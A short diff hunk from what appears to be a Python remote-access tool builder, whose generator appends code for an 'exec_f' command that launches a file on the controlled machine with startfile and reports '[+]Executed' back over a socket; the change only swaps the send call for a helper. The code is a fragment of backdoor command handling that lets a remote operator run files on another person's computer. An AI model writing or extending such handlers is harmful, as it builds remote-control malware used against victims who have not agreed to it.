@@ -9,7 +9,7 @@ def main(option):
         config.functions.append('''
 def exec_f(file):
     startfile(file.split(' ',1)[1])
-    s.sendall(('[+]Executed : ' + file.split(' ',1)[1]).encode())''')
+    send_all(s,'[+]Executed : ' + file.split(' ',1)[1])''')
         config.logics.append('''
             elif command == "exec_f":
                 exec_f(data)''')
